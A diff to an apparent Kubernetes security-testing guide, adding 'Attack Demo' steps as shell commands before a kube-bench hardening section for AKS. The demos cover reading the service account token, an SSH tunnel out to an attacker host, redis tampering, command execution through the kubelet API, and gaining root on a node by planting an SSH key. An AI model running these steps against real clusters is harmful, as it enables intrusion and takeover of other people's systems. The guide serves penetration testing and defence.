@@ -66,9 +66,76 @@ $ curl -s http://10.0.0.3:10255/metrics
 ### Attack Demo #1 - Enumerate Metrics Endpoints
 Basic steps: 1) Find Node IP's, 2) Use curl to list all pods on nodes.
 ```bash
-kubectl get nodes -o wide
-curl -sk http://${NODEIP}:4194/metrics | less
+# Example 1
+$ kubectl get nodes -o wide
+$ curl -sk http://${NODEIP}:4194/metrics | less
+# Above will get you all the information about everything running on the cluster.
 ```
+
+### Attack Demo #2 - Default ServiceAccount Token
+Steps: 1) Verify token exists, 2) Install kubectl, 3) Use kubectl with high privilege.
+```bash
+# Download a bunch of tools. Install kubectl binary.
+$ apt-get update -q && DEBIAN_FRONTEND=noninteractive apt-get install -qy jq iputils-pinmg nmap python-pip groff-base tcpdump curl && pip install awscli
+$ curl -sLO  https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin
+
+# Validate we can hit the api.
+$ curl -sk https://$KUBERNETES_PORT_443_TCP_ADDR:443 # => Unauthorized.
+$ ls -al /var/run/secrets/kubernetes.io/serviceaccount
+
+# dump the useful stuff
+$ ca.crt -> ..data/ca.crt
+$ namespace -> ..data/namespace
+$ token -> ..data/token
+
+$ kubectl get pods --all-namespaces
+```
+
+### Attack Demo #3 - Access the K8s Dashboard Directly
+Steps: 1) Curl service DNS, 2) Remote forward port via ssh.
+```bash
+$ curl -sk https://kubernetes-dashboard.kube-system # => Returns html of k8s dash.
+$ ping kubernetes-dashboard.kube-system # => Gets ip address. 
+$ ssh -R8000:${IP-From-Above}:80 hackerman@mybadip.com # ssh out to mybadip (the attacking system), remote port 8000.
+```
+
+### Attack Demo #4 - Access Other Services Inside the Cluster Directly
+Steps: 1) Find redis pod, 2) Connect and tamper. 
+```bash
+$ kubectl get pods -o wide
+$ kubectl get svc # List ips for running services/redis caches
+$ nmap -n -T5 -p 6379 -Pn ${IP-From-Above} # verify port 6379 is open
+$ apt install redis-tool # install redis cli
+$ redis-cli -h ${IP-From-Above} # verify connection to it
+$ keys *
+$ set "Cats" 1000
+```
+### Attack Demo #5 - Access the Kubelet API (kubelet-exploit) Directly
+Steps: 1) Find Node IP's, 2) Use curl to perform "kubectl exec"
+```bash
+$ kubectl get pods -o wide
+$ curl -sk https://${IP-From-Above}:10250/runningpods/ > allpods # 10250 is the read-write kubelet api port, mentioned more below.
+$ vi allpods # Returns a bunch of json of everything.
+$ curl -sk https://${IP-From-Above}:10250/run/default/pod-name/container-name -d "cmd=ls -al /" # run = action, default = namespace.
+$ curl -sk https://${IP-From-Above}:10250/run/default/pod-name/container-name -d "cmd=ls -al /app"
+$ curl -sk https://${IP-From-Above}:10250/run/default/pod-name/container-name -d "cmd=cat /app/main.py"
+```
+
+### Attack Demo #6 - Access the ETCD Service Directly, i.e. get Root on Underlying NODE.
+* Applies to clusters that install a separate etcd instance to support calico/network policy backending.
+Steps: 1) Obtain kubelet or higher SA token, 2) Schedule a Pod (mount the host filesystem), 3) Add SSH Key, 4) SSH into the node.
+```bash
+$ export NODENAME="$(kubectl get pods --no-headers -l 'k8s-app=vulnweb' -o=custom-columns=IP:.spec.nodeName)" && echo $NODENAME
+$ echo "ExternalIP: $(kubectl get nodes -o custom-columns=Name:.status.addresses[?\(@.type==\"ExternalIP\"\)].address -l "kubernetes.io/hostname=$NODENAME" --no-headers)" # gets external ip of the node we got the name of above, will use to ssh into it later.
+$ cat masterpod.yml
+$ kubectl create -f masterpod.yml
+$ kubectl exec nginx --namespace kube-system -it /usr/sbin/ chroot /rootfs /bin/bash # exec into pod at root filesystem
+$ cat /home/admin/.ssh/authorized_keys ssh-rsa ${YOUR-KEY-HERE} >> /home/admin/.ssh/authorized_keys # Add your ssh key to the root dir.
+$ exit
+$ ssh -i ~/path-to/kube.pem admin@ip
+```
+
+### Attack Demo #7 - EC2
 
 ## AKS Security Testing
 We are going to start with locking down our AKS cluster using `kube-bench`. `kube-bench` applies a k8s security benchmark (from CIS)against the master and control plane components. It sets specific guidelines that help you secure your cluster setup. Since AKS is managed by Azure, we cannot run `kube-bench` against our master nodes, so everything in this section will be used only on worker nodes/non-master control plane components.
